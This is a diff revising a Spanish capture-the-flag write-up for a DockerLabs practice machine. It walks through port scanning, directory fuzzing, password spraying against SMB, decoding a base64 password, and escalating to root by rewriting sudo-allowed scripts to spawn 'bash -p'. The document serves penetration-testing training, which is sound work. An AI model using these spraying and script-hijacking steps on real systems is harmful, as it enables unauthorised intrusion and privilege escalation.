@@ -2,15 +2,28 @@ Propiedades:
 - OS: Linux
 - Plataforma: DockerLabs
 - Nivel: Easy
-- Tags: #dockerlabs #smb
+- Tags: #smb #password-reuse #sudo-abuse #python-hijacking #base64
 
 ![](assets/Pasted%20image%2020251107000945.png)
 
 ## Reconocimiento
 
-Empiezo tirando un escaneo con nmap
+Comienzo tirando un ping para comprobar la conectividad.
+
 ```bash
-nmap -p- -sS -Pn -n --min-rate 5000 -vvv 172.17.0.2
+> ping -c 1 172.17.0.2
+PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
+64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.315 ms
+
+--- 172.17.0.2 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.315/0.315/0.315/0.000 ms
+```
+
+Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.
+
+```bash
+> nmap -p- -sS -Pn -n --min-rate 5000 -vvv 172.17.0.2
 ----------------------------------------------------
 PORT    STATE SERVICE      REASON
 22/tcp  open  ssh          syn-ack ttl 64
@@ -19,11 +32,14 @@ PORT    STATE SERVICE      REASON
 445/tcp open  microsoft-ds syn-ack ttl 64
 ```
 
-Tiro un escaneo mas profundo sobre los puertos abiertos
+- Puertos 22, 80, 139 y 445 abiertos.
+
+Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.
+
 ```bash
-nmap -p 22,80,139,445 -sCV -sS -Pn -n --min-rate 5000 -vvv 172.17.0.2
+> nmap -p 22,80,139,445 -sCV -sS -Pn -n --min-rate 5000 -vvv 172.17.0.2
 ----------------------------------------------------------------------
-ORT    STATE SERVICE     REASON         VERSION
+PORT    STATE SERVICE     REASON         VERSION
 22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
 | ssh-hostkey: 
 |   256 39:f8:44:51:19:1a:a9:78:c2:21:e6:19:d3:1e:41:96 (ECDSA)
@@ -39,20 +55,28 @@ ORT    STATE SERVICE     REASON         VERSION
 445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
 MAC Address: BA:6A:21:B3:CA:59 (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
 ```
 
-- Se están corriendo un servicios apache en el puerto 80 y samba en los puertos 139 y 445
+- Puerto 22 SSH OpenSSH 9.2p1 Debian 2+deb12u3
+- Puerto 80 HTTP Apache httpd 2.4.61 (Debian)
+- Puertos 139 y 445 SMB Samba smbd 4.6.2
 
 ## Enumeración
 
+### Puerto 80 HTTP
 
-**Puerto 80**
+La página principal es una landing page temática de Juego de Tronos. En el contenido de la página podemos identificar posibles usuarios del sistema:
 
-- Lo único relevante que noto en la pagina principal son los posibles usuarios _jon_, _Daenerys_ y _Arya_ 
+- `jon`
+- `daenerys`
+- `arya`
+
 ![](assets/Pasted%20image%2020251106200304.png)
 
-Procedo a realizar Fuzzing con gobuster
+**Fuzzing de Directorios.**
+
+Utilicé `gobuster` para descubrir posibles recursos en el servidor web.
+
 ```bash
 > gobuster dir -w /home/wndr/Tools/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://172.17.0.2/ -x html,php,js,py,txt
 ===============================================================
@@ -63,14 +87,18 @@ Starting gobuster in directory enumeration mode
 /dragon               (Status: 301) [Size: 309] [--> http://172.17.0.2/dragon/]
 ```
 
-Encuentro un directorio llamado _/dragon_ donde al parecer esta un archivo llamado EpisodiosT1
-- Puede que sean posibles contraseñas por lo que procedo a bajarme la archivo 
+- Encuentro un directorio `/dragon`
+
+Accediendo al directorio `/dragon` encuentro un archivo de texto llamado `EpisodiosT1` que contiene lo que parecen ser posibles contraseñas.
+
 ![](assets/Pasted%20image%2020251106200637.png)
 
-**Servicio SMB**
+Descargo el archivo para utilizarlo como diccionario en posibles ataques de fuerza bruta.
 
-Con `smbmap` procedo a enumerar y listar recursos compartidos del servicio.
-- Al parecer no tenemos acceso a nada
+### Servicio SMB
+
+Con `smbmap` procedo a enumerar y listar recursos compartidos del servicio SMB sin autenticación.
+
 ```bash
 > smbmap -H 172.17.0.2
 -------------------------------------------------------------------------------------------------------
@@ -83,19 +111,24 @@ Con `smbmap` procedo a enumerar y listar recursos compartidos del servicio.
 	nobody                                            	NO ACCESS	Home Directories
 ```
 
+- Vemos un recurso compartido llamado `shared` pero no tenemos acceso sin credenciales.
+
 ## Explotación
 
-Al ver que prácticamente no hay mucha informacion mas que los posibles usuarios y contraseñas que conseguí recopilar del servicio de apache lo primero que intento es un ataque de fuerza bruta al servicio _smb_ utilizando como diccionarios los posibles usuarios y contraseñas del servicio apache
+Al tener posibles usuarios y contraseñas recopilados del servicio HTTP, decidí realizar un ataque de **Password Spraying** contra el servicio SMB utilizando `netexec`.
+
+El Password Spraying consiste en probar una misma contraseña contra múltiples usuarios, lo cual es menos intrusivo que un ataque de fuerza bruta tradicional y tiene menor probabilidad de bloquear cuentas.
 
 ```bash
-> nxc smb 172.17.0.2 -u possible_users.txt -p possible_passwords
+> nxc smb 172.17.0.2 -u possible_users.txt -p possible_passwords.txt
 ----------------------------------------------------------------
 SMB         172.17.0.2      445    7BDD00394D8E     [+] 7BDD00394D8E\jon:seacercaelinvierno
 ```
 
-- Al parecer tenemos acceso al servicio smb usando las credenciales _jon:seacercaelinvierno_.
+- Encuentro credenciales válidas: `jon:seacercaelinvierno`
 
-Procedo a enumerar los recursos del servicio smb a los cuales el usuario jon tiene acceso
+Ahora enumero los recursos SMB a los que el usuario `jon` tiene acceso.
+
 ```bash
 > smbclient -L //172.17.0.2 -U jon
 Password for [WORKGROUP\jon]:
@@ -104,12 +137,13 @@ Password for [WORKGROUP\jon]:
 	---------       ----      -------
 	print$          Disk      Printer Drivers
 	shared          Disk      
+	IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
 ```
 
-- Tengo acceso al recurso shared
+- Tengo acceso al recurso `shared`
 
-Me conecto a shared y veo que recursos existen dentro de el
-- Al parecer existe un archivo llamado proteccion_del_reino el cual me bajo en mi maquina.
+Me conecto al recurso compartido `shared` para explorar su contenido.
+
 ```bash
 > smbclient //172.17.0.2/shared -U jon
 Password for [WORKGROUP\jon]:
@@ -120,9 +154,13 @@ smb: \> ls
   proteccion_del_reino                N      313  Tue Jul 16 14:26:00 2024
 
 smb: \> get proteccion_del_reino
+getting file \proteccion_del_reino of size 313 as proteccion_del_reino (76.4 KiloBytes/sec) (average 76.4 KiloBytes/sec)
 ```
 
-Inspecciono el archivo _proteccion_del_reino_
+- Encuentro y descargo un archivo llamado `proteccion_del_reino`
+
+Inspecciono el contenido del archivo descargado.
+
 ```bash
 > cat proteccion_del_reino
 Aria de ti depende que los caminantes blancos no consigan pasar el muro. 
@@ -130,24 +168,31 @@ Tienes que llevar a la reina Daenerys el mensaje, solo ella sabra interpretarlo.
 Esta es mi contraseña, se encuentra cifrada en ese lenguaje y es -> aGlqb2RlbGFuaXN0ZXI=
 ```
 
-Al parecer nos proporcionan una contraseña codificada en base64 por lo cual decido decodificarla
+El archivo contiene una contraseña codificada en Base64. Procedo a decodificarla.
+
 ```bash
 > echo "aGlqb2RlbGFuaXN0ZXI=" | base64 -d; echo
 hijodelanister
 ```
 
-Ok por ahora lo que tenemos es una contraseña y los usuarios _jon_, _daenerys_ y _aria_ por lo cual ahora decido utilizar la contraseña proporcionada para tratar de conectarme mediante ssh con alguno de estos usuarios.
+- Contraseña decodificada: `hijodelanister`
+
+Con esta contraseña y los usuarios identificados anteriormente (`jon`, `daenerys`, `arya`), intento acceder por SSH.
+
 ```bash
 > ssh jon@172.17.0.2
+jon@172.17.0.2's password: hijodelanister
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-76-generic x86_64)
+
+jon@7bdd00394d8e:~$ whoami
+jon
 ```
 
-- El usuario con el que pude ingresar al SSH fue _jon_
-
-
+- Acceso exitoso como el usuario `jon`
 
 ## Escalada de Privilegios
 
-Dentro del sistema con el usuario _jon_ lo primero que hice fue listar binarios para ver si podía migrar a algún usuario
+Dentro del sistema enumero binarios que pueda ejecutar con privilegios elevados.
 
 ```bash
 > sudo -l
@@ -156,7 +201,11 @@ User jon may run the following commands on 7bdd00394d8e:
     (aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py
 ```
 
-Al parecer podemos ejecutar un script llamado _mensaje.py_ por lo cual procedemos a realizar un sustitución del script, es decir vamos a borrar el script actual para remplazarlo por un script que ejecute una bash como el usuario aria
+- Puedo ejecutar el script `/home/jon/.mensaje.py` como el usuario `aria` sin contraseña.
+
+Esta es una oportunidad para realizar un **Python Script Hijacking**. Como tengo permisos de escritura sobre el script, puedo modificar su contenido para ejecutar comandos arbitrarios como el usuario `aria`.
+
+Reemplazo el contenido del script con código que me otorgue una shell.
 
 ```bash
 > jon@7bdd00394d8e:~$ rm /home/jon/.mensaje.py
@@ -166,28 +215,33 @@ import os
 
 os.system("bash -p")
 ----------------------------------------------------
-
 ```
 
-Ejecutamos el script para migrar al usuario aria
+Ejecuto el script modificado para migrar al usuario `aria`.
+
 ```bash
 jon@7bdd00394d8e:~$ sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
 aria@7bdd00394d8e:/home/jon$ whoami
 aria
 ```
 
-Mismo proceso, volvemos a listar binarios pero ahora con el usuario aria
+### Migración a daenerys
+
+Vuelvo a enumerar binarios con privilegios elevados, ahora como el usuario `aria`.
+
 ```bash
-sudo -l
+> sudo -l
 ----------------------------------------------------------
 User aria may run the following commands on 7bdd00394d8e:
     (daenerys) NOPASSWD: /usr/bin/cat, /usr/bin/ls
 ```
 
-Ahora vemos que podemos hacer uso de _ls_ y _cat_ como el usuario daenerys por lo cual procedemos a usar _ls_ para listar archivos del directorio /home/daenerys 
-- Aquí vemos un archivo interesante llamado mensajeParaJon
+- Puedo ejecutar `cat` y `ls` como el usuario `daenerys` sin contraseña.
+
+Esto me permite leer archivos del directorio home de `daenerys`. Utilizo `ls` para listar el contenido.
+
 ```bash
-ria@7bdd00394d8e:/home/jon$ sudo -u daenerys /usr/bin/ls -lsa /home/daenerys
+> aria@7bdd00394d8e:/home/jon$ sudo -u daenerys /usr/bin/ls -lsa /home/daenerys
 total 16
 0 drwx------ 1 daenerys daenerys    0 Jul 16  2024 .
 0 drwxr-xr-x 1 root     root        6 Jul 16  2024 ..
@@ -198,7 +252,10 @@ total 16
 4 -rw-rw-r-- 1 daenerys daenerys  277 Jul 16  2024 mensajeParaJon
 ```
 
-Sabiendo que existe un archivo que podemos ver ahora procedemos a hacer uso del _cat_ para inspeccionar el archivo mensajeParaJon.
+- Encuentro un archivo interesante llamado `mensajeParaJon`
+
+Utilizo `cat` para leer el contenido del archivo.
+
 ```bash
 > aria@7bdd00394d8e:/home/jon$ sudo -u daenerys /usr/bin/cat /home/daenerys/mensajeParaJon
 Aria estare encantada de ayudar a Jon con la guerra en el norte, siempre y cuando despues Jon cumpla y me ayude a  recuperar el trono de hierro. 
@@ -207,16 +264,21 @@ Te dejo en este mensaje la contraseña de mi usuario por si necesitas llamar a u
 !drakaris!
 ```
 
-Migramos al usuario _danerys_ con la password _drakaris_
+- Encuentro la contraseña de `daenerys`: `!drakaris!`
+
+Migro al usuario `daenerys` utilizando la contraseña encontrada.
+
 ```bash
 > aria@7bdd00394d8e:/home/jon$ su daenerys
-Password: 
+Password: !drakaris!
 > daenerys@7bdd00394d8e:/home/jon$ whoami
 daenerys
 ```
 
-Mismo proceso, volvemos a listar binarios que podamos ejecutar como el usuario root
-- Podemos ejecutar un script de bash
+### Escalada a root
+
+Enumero nuevamente los privilegios sudo del usuario `daenerys`.
+
 ```bash
 daenerys@7bdd00394d8e:/home/jon$ sudo -l
 
@@ -224,7 +286,12 @@ User daenerys may run the following commands on 7bdd00394d8e:
     (ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
 ```
 
-Remplazamos el contenido del script _.shell.sh_ por este
+- Puedo ejecutar el script `/home/daenerys/.secret/.shell.sh` como root sin contraseña.
+
+Como tengo permisos de escritura sobre este script, puedo modificarlo para obtener una shell como root.
+
+Reemplazo el contenido del script.
+
 ```bash
 daenerys@7bdd00394d8e:~/.secret$ nano .shell.sh
 daenerys@7bdd00394d8e:~/.secret$ cat .shell.sh 
@@ -233,11 +300,14 @@ daenerys@7bdd00394d8e:~/.secret$ cat .shell.sh
 bash -p
 ```
 
-Ejecutamos el script y escalamos a root
+Ejecuto el script y obtengo acceso como root.
+
 ```bash
 daenerys@7bdd00394d8e:~/.secret$ sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
 root@7bdd00394d8e:/home/daenerys/.secret# whoami
 root
+root@7bdd00394d8e:/home/daenerys/.secret# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
-***PWNED*
+***PWNED***
